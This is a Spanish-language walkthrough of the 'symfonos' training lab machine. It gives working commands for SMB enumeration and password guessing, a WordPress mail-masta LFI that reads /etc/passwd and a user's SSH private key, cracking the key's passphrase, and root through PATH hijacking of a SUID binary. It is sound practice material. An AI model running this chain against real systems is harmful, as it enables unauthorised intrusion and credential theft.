Escaneo:

```
Nmap scan report for 10.0.2.5
Host is up (0.00034s latency).
Not shown: 2 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:A8:83:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2025-07-05T10:03:00-05:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-07-05T15:02:59
|_  start_date: N/A
|_clock-skew: mean: 1h40m01s, deviation: 2h53m13s, median: 0s
```

Vamos a intentar listar los recursos compartidos por SMB puerto 445:

```
smbmap -H 10.0.2.5
```

![[Pasted image 20250705120909.png]]

Sin proporcionar contraseña tenemos acceso al recurso `anonymous`, y además vemos un recurso compartido de un tal `helios` posible usuario de sistema. Vamos a listar el contenido de ese recurso:

```
smbmap -H 10.0.2.5 -r anonymous
```

![[Pasted image 20250705121202.png]]

Vamos a descargarnos el archivo `attention.txt`:

```
smbmap -H 10.0.2.5 --download anonymous/attention.txt
```

![[Pasted image 20250705121325.png]]

![[Pasted image 20250705121422.png]]

Vemos posibles contraseñas `epidioko`, `qwerty`, `baseball`. Tenemos contraseñas, vamos a intentar enumerar usuarios del sistema de la siguiente forma:

```
crackmapexec smb 10.0.2.5 --users
```

![[Pasted image 20250705121905.png]]

Vemos el usuario `helios` reportado. Tenemos un usuario, y posibles contraseñas, vamos a intentar conectarnos al recurso `Helios`, con el usuario `helios` y con alguna de las contraseñas, haciendo fuerza bruta. Para ello crearemos un archivo `passwords.txt` con las anteriores contraseñas:

![[Pasted image 20250705122401.png]]

Haremos fuerza bruta de la siguiente manera:

```
crackmapexec smb 10.0.2.5 -u helios -p passwords.txt
```

![[Pasted image 20250705122615.png]]

No ha reportado nada, intentaremos con `smbmap`:

```
smbmap -H 10.0.2.5 -u helios -p <epidioko>
smbmap -H 10.0.2.5 -u helios -p <qwerty>
```

![[Pasted image 20250705122747.png]]

La password `qwerty` ha dado resultado, ahora nos conectaremos al recurso compartido de helios.

```
smbclient //10.0.2.5/helios -U helios --password qwerty
```

![[Pasted image 20250705123132.png]]

![[Pasted image 20250705123243.png]]

Vemos una posible ruta del servicio web de la máquina `h3l105`.

![[Pasted image 20250705123530.png]]

La página no carga del todo bien, revisemos el código fuente.

![[Pasted image 20250705123632.png]]

Vemos que se está aplicando VirtualHosting `symfonos.local`, vamos a agregarlo al `/etc/hosts`.

![[Pasted image 20250705123804.png]]

![[Pasted image 20250705123939.png]]

Vemos que se está usando un gestor de contenidos Wordpress, vamos a realizar un escaneo con `wpscan`

```
wpscan --url http://symfonos.local/h3l105
```

o

```
wpscan --url http://symfonos.local/h3l105 -e p --plugins-detection aggressive
```

![[Pasted image 20250701213227.png]]

También, en caso de no reportar nada, debemos revisar el código fuente de la página:

![[Pasted image 20250705131511.png]]

![[Pasted image 20250705131541.png]]

![[Pasted image 20250705133846.png]]

Vemos dos plugins `mail-masta` y `site-editor`. Busquemos exploits para el primero:

```
searchsploit wordpress mail masta
```

![[Pasted image 20250705131920.png]]

Encontramos una vulnerabilidad tipo LFI, examinaremos el 1ro de los exploits `40290.txt`

```
searchsploit -x 40290.txt
```

![[Pasted image 20250705134048.png]]

Haremos el PoC de la siguiente manera:

```
curl -s -X GET 'http://10.0.2.5/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
```

![[Pasted image 20250705134312.png]]

Funciona, vemos en el sistema el usuario `helios`. Veremos si tiene alguna clave de acceso en su directorio `.ssh`.

```
curl -s -X GET 'http://10.0.2.5/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/helios/.ssh/id_rsa' > id_rsa
chmod 600 id_rsa
```

![[Pasted image 20250705134844.png]]

La clave `id_rsa` está encriptada, es decir que necesita de una password, intentaremos romperla de la siguiente manera:

```
ssh2john id_rsa > hash.txt 
```

Extraemos el hash de la password, para luego intentar descifrarla con john.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Pasted image 20250705135250.png]]

Ahora, nos intentaremos conectar por ssh, proporcionando la id_rsa como el usuario helios.

```
ssh -i id_rsa helios@10.0.2.5 //id_rsa pass -> 123123
```

![[Pasted image 20250705135435.png]]

## Escalada de Privilegios

```
find / -perm -4000 2>/dev/null
```

![[Pasted image 20250705135824.png]]

Buscamos binarios con permisos SUID, y encontramos un `/opt/statuscheck`. Vamos a ejecutarlo:

![[Pasted image 20250705140025.png]]

Vemos un output muy similar al de `curl`, vamos a ver el contenido del binario con el comando `strings`.

```
strings /opt/statuscheck
```

![[Pasted image 20250705140214.png]]

Vemos que el comando `curl` se está usando sin emplear su ruta ablsouta `/usr/bin/curl`, por lo tanto puede acontecer un **Path Hijacking**, en el directorio personal de helios crearemos un script con el nombre de `curl` que le brinde permisos SUID a `/bin/bash`, de damos permisos de ejecución al script de curl malicioso y modificamos el PATH para que empiece su búsqueda en el directorio actual:

```
echo "chmod u+s /bin/bash" > curl
chmod +x curl
ls -la curl
export PATH=.:$PATH
/opt/statuscheck
ls -la /bin/bash
```

![[Pasted image 20250705140939.png]]

```
/bin/bash -p
whoami
```

![[Pasted image 20250705141040.png]]

![[Pasted image 20250705141234.png]]
## Primera máquina resuelta


